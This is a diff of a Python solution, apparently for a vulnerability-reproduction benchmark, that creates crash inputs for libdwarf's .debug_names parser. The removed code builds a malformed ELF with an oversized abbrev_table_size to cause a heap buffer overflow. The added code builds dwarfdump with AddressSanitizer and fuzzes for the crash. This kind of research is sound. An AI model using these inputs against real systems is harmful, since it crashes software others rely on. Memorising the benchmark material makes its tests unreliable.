@@ -1,159 +1,192 @@
-import struct
 import os
+import sys
+import subprocess
+import tarfile
+import tempfile
+import shutil
+import random
+import struct
+import time
+import concurrent.futures
+import uuid
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in libdwarf .debug_names parsing.
-        The vulnerability involves incorrect limit calculations when reading the .debug_names section,
-        specifically when abbrev_table_size is checked/used.
-        """
+        work_dir = tempfile.mkdtemp()
         
-        # 1. ELF Header (64-bit, LSB)
-        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        e_type = 1 # ET_REL
-        e_machine = 62 # AMD64
-        e_version = 1
-        e_entry = 0
-        e_phoff = 0
-        e_shoff = 0 # To be calculated
-        e_flags = 0
-        e_ehsize = 64
-        e_phentsize = 0
-        e_phnum = 0
-        e_shentsize = 64
-        e_shnum = 0 # To be calculated
-        e_shstrndx = 0 # To be calculated
+        try:
+            # 1. Extract the source code
+            if os.path.isfile(src_path):
+                with tarfile.open(src_path) as tar:
+                    tar.extractall(path=work_dir)
+            
+            # Locate the build root (where configure script is)
+            build_root = work_dir
+            for root, dirs, files in os.walk(work_dir):
+                if 'configure' in files:
+                    build_root = root
+                    break
+            
+            # 2. Compile libdwarf/dwarfdump with AddressSanitizer
+            env = os.environ.copy()
+            # Optimize for speed but keep debug info and sanitizers
+            cflags = "-g -O1 -fsanitize=address -fno-omit-frame-pointer"
+            env['CFLAGS'] = cflags
+            env['CXXFLAGS'] = cflags
+            env['LDFLAGS'] = "-fsanitize=address"
+            
+            try:
+                subprocess.run(
+                    ["./configure", "--disable-shared", "--disable-dependency-tracking"],
+                    cwd=build_root, env=env,
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
+                )
+                subprocess.run(
+                    ["make", "-j8"],
+                    cwd=build_root, env=env,
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
+                )
+            except subprocess.CalledProcessError:
+                # If build fails, we proceed to check if binary was created anyway
+                pass
 
-        # 2. Section Data Generation
-        
-        # .shstrtab section content
-        # Offsets: 0: \0, 1: .shstrtab\0, 11: .debug_names\0
-        shstrtab_data = b'\x00.shstrtab\x00.debug_names\x00'
-        
-        # .debug_names section content
-        # DWARF5 .debug_names header and body
-        # We construct a body with a valid structure but malicious abbrev_table_size
-        dn_body = bytearray()
-        
-        # Header (excluding unit_length)
-        dn_body.extend(struct.pack('<H', 5))       # version (2 bytes)
-        dn_body.extend(struct.pack('<H', 0))       # padding (2 bytes)
-        dn_body.extend(struct.pack('<I', 1))       # comp_unit_count (4 bytes)
-        dn_body.extend(struct.pack('<I', 0))       # local_type_unit_count (4 bytes)
-        dn_body.extend(struct.pack('<I', 0))       # foreign_type_unit_count (4 bytes)
-        dn_body.extend(struct.pack('<I', 1))       # bucket_count (4 bytes)
-        dn_body.extend(struct.pack('<I', 1))       # name_count (4 bytes)
-        
-        # MALICIOUS FIELD: abbrev_table_size
-        # Set to a value larger than the remaining data in the section.
-        # This forces the parser (if limits are miscalculated) to read past the end of the buffer.
-        dn_body.extend(struct.pack('<I', 0x4000))  # abbrev_table_size (4 bytes)
-        
-        dn_body.extend(struct.pack('<I', 0))       # augmentation_string_size (4 bytes)
-        # Augmentation string is empty (0 bytes)
-        
-        # Tables
-        # CU List: 1 entry (comp_unit_count=1)
-        dn_body.extend(struct.pack('<I', 0))       # Offset 0
-        
-        # Local/Foreign TU Lists are empty (counts=0)
-        
-        # Bucket Table: 1 entry (bucket_count=1)
-        dn_body.extend(struct.pack('<I', 0))
-        
-        # Hash Table: 1 entry (name_count=1)
-        dn_body.extend(struct.pack('<I', 0))
-        
-        # Name Table: 1 entry (name_count=1) -> 2 * 4 bytes
-        dn_body.extend(struct.pack('<I', 0))       # String offset
-        dn_body.extend(struct.pack('<I', 0))       # Entry offset
-        
-        # Abbrev Table: Should follow here, but we provide NO data.
-        # The parser expects 0x4000 bytes based on header.
-        
-        # Prepend unit_length
-        # unit_length covers the body length.
-        dn_full = struct.pack('<I', len(dn_body)) + dn_body
-        
-        # 3. Assemble File Layout
-        current_offset = 64 # Size of ELF header
-        
-        # Place .shstrtab
-        shstrtab_offset = current_offset
-        current_offset += len(shstrtab_data)
-        
-        # Align to 4 bytes
-        pad1 = b''
-        if current_offset % 4 != 0:
-            pad_len = 4 - (current_offset % 4)
-            pad1 = b'\x00' * pad_len
-            current_offset += pad_len
+            # Locate the compiled dwarfdump binary
+            dwarfdump_bin = None
+            for root, dirs, files in os.walk(build_root):
+                if 'dwarfdump' in files:
+                    candidate = os.path.join(root, 'dwarfdump')
+                    if os.access(candidate, os.X_OK) and os.path.isfile(candidate):
+                        dwarfdump_bin = candidate
+                        break
             
-        # Place .debug_names
-        dn_offset = current_offset
-        dn_size = len(dn_full)
-        current_offset += dn_size
-        
-        # Align to 8 bytes for Section Header Table
-        pad2 = b''
-        if current_offset % 8 != 0:
-            pad_len = 8 - (current_offset % 8)
-            pad2 = b'\x00' * pad_len
-            current_offset += pad_len
+            if not dwarfdump_bin:
+                # Without the binary we cannot verify, return empty bytes or handle error
+                return b""
+
+            # 3. Generate a Seed Input
+            # We create a valid ELF object with DWARF 5 debug info using system gcc
+            seed_c = os.path.join(work_dir, "seed.c")
+            seed_o = os.path.join(work_dir, "seed.o")
+            with open(seed_c, "w") as f:
+                f.write("int main() { return 0; }")
             
-        e_shoff = current_offset
-        
-        # 4. Construct Section Header Table
-        
-        # Entry 0: NULL
-        sht_data = bytearray()
-        sht_data.extend(b'\x00' * 64)
-        
-        # Entry 1: .shstrtab
-        # sh_name = 1
-        # sh_type = SHT_STRTAB (3)
-        sht_data.extend(struct.pack('<I', 1))      # sh_name
-        sht_data.extend(struct.pack('<I', 3))      # sh_type
-        sht_data.extend(struct.pack('<Q', 0))      # sh_flags
-        sht_data.extend(struct.pack('<Q', 0))      # sh_addr
-        sht_data.extend(struct.pack('<Q', shstrtab_offset)) # sh_offset
-        sht_data.extend(struct.pack('<Q', len(shstrtab_data))) # sh_size
-        sht_data.extend(struct.pack('<I', 0))      # sh_link
-        sht_data.extend(struct.pack('<I', 0))      # sh_info
-        sht_data.extend(struct.pack('<Q', 1))      # sh_addralign
-        sht_data.extend(struct.pack('<Q', 0))      # sh_entsize
-        
-        # Entry 2: .debug_names
-        # sh_name = 11
-        # sh_type = SHT_PROGBITS (1)
-        sht_data.extend(struct.pack('<I', 11))     # sh_name
-        sht_data.extend(struct.pack('<I', 1))      # sh_type
-        sht_data.extend(struct.pack('<Q', 0))      # sh_flags
-        sht_data.extend(struct.pack('<Q', 0))      # sh_addr
-        sht_data.extend(struct.pack('<Q', dn_offset)) # sh_offset
-        sht_data.extend(struct.pack('<Q', dn_size))   # sh_size
-        sht_data.extend(struct.pack('<I', 0))      # sh_link
-        sht_data.extend(struct.pack('<I', 0))      # sh_info
-        sht_data.extend(struct.pack('<Q', 1))      # sh_addralign
-        sht_data.extend(struct.pack('<Q', 0))      # sh_entsize
-        
-        e_shnum = 3
-        e_shstrndx = 1
-        
-        # 5. Finalize ELF Header
-        elf_header = struct.pack('<16sHHIQQQQIHHHHHH', 
-                                 e_ident, e_type, e_machine, e_version, e_entry,
-                                 e_phoff, e_shoff, e_flags, e_ehsize,
-                                 e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx)
-        
-        # 6. Combine all parts
-        file_data = bytearray()
-        file_data.extend(elf_header)
-        file_data.extend(shstrtab_data)
-        file_data.extend(pad1)
-        file_data.extend(dn_full)
-        file_data.extend(pad2)
-        file_data.extend(sht_data)
-        
-        return bytes(file_data)
+            # Try compiling with -gdwarf-5
+            subprocess.run(
+                ["gcc", "-gdwarf-5", "-c", seed_c, "-o", seed_o],
+                cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            
+            # Fallback to standard -g if -gdwarf-5 fails
+            if not os.path.exists(seed_o):
+                 subprocess.run(
+                    ["gcc", "-g", "-c", seed_c, "-o", seed_o],
+                    cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+            
+            if not os.path.exists(seed_o):
+                return b""
+
+            with open(seed_o, "rb") as f:
+                seed_data = bytearray(f.read())
+
+            # 4. Fuzzing Loop
+            # We use multiple threads to invoke dwarfdump on mutated inputs
+            found_crash = None
+            stop_fuzzing = False
+            
+            def fuzz_worker():
+                nonlocal found_crash, stop_fuzzing
+                
+                # Use a unique filename for this worker/iteration to avoid collisions
+                unique_filename = os.path.join(work_dir, f"fuzz_{uuid.uuid4().hex}.o")
+                local_data = bytearray(seed_data)
+                
+                # Run a batch of mutations to amortize thread overhead
+                for _ in range(50):
+                    if stop_fuzzing:
+                        return
+
+                    # Mutation Logic
+                    # Reset to seed occasionally
+                    if random.random() < 0.2:
+                        local_data[:] = seed_data
+                    
+                    mutation_type = random.random()
+                    if mutation_type < 0.5:
+                        # 32-bit Integer Injection (targeting counts/sizes)
+                        if len(local_data) > 4:
+                            pos = random.randint(0, len(local_data) - 4)
+                            # Interesting values for overflow/logic errors
+                            val = random.choice([
+                                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, 
+                                0xFFFF, 0x10000, 0, 1, 
+                                random.randint(0, 0xFFFFFFFF)
+                            ])
+                            struct.pack_into("<I", local_data, pos, val)
+                    elif mutation_type < 0.8:
+                        # Byte randomization
+                        pos = random.randint(0, len(local_data) - 1)
+                        local_data[pos] = random.randint(0, 255)
+                    else:
+                        # Bit flipping
+                        pos = random.randint(0, len(local_data) - 1)
+                        local_data[pos] ^= (1 << random.randint(0, 7))
+
+                    # Write mutated file
+                    with open(unique_filename, "wb") as f:
+                        f.write(local_data)
+                    
+                    # Run target
+                    # -n tells dwarfdump to print .debug_names section (vulnerable path)
+                    try:
+                        proc = subprocess.run(
+                            [dwarfdump_bin, "-n", unique_filename],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.PIPE,
+                            timeout=0.2  # Fast timeout
+                        )
+                        
+                        if proc.returncode != 0:
+                            # Check for ASAN error
+                            stderr_out = proc.stderr.decode(errors='ignore')
+                            if "AddressSanitizer" in stderr_out or "heap-buffer-overflow" in stderr_out:
+                                found_crash = bytes(local_data)
+                                stop_fuzzing = True
+                                return
+                    except subprocess.TimeoutExpired:
+                        pass
+                    except Exception:
+                        pass
+                
+                # Cleanup
+                if os.path.exists(unique_filename):
+                    os.remove(unique_filename)
+
+            # Use ThreadPoolExecutor to run fuzz workers
+            start_time = time.time()
+            max_duration = 180  # Max 3 minutes
+            
+            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
+                futures = set()
+                while time.time() - start_time < max_duration and not stop_fuzzing:
+                    # Maintain pool saturation
+                    while len(futures) < 16 and not stop_fuzzing:
+                        futures.add(executor.submit(fuzz_worker))
+                    
+                    # Wait for at least one to complete
+                    done, futures = concurrent.futures.wait(
+                        futures, 
+                        timeout=0.1, 
+                        return_when=concurrent.futures.FIRST_COMPLETED
+                    )
+            
+            if found_crash:
+                return found_crash
+            
+            # If no crash found, return the seed as best effort
+            return bytes(seed_data)
+
+        except Exception:
+            return b""
+        finally:
+            shutil.rmtree(work_dir, ignore_errors=True)
